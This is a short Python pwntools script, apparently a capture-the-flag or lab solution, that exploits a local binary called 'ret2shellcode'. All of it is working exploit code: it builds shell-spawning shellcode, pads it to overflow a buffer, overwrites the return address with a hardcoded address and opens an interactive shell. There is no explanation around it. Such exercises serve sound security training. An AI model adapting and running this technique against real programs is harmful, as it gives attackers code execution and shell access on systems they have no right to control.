from pwn import *

io=process("./ret2shellcode")
io.recvline()
shell=asm(shellcraft.sh())
payload=shell.ljust(112,b'a')+p32(0x804a080)
io.sendline(payload)
io.interactive()
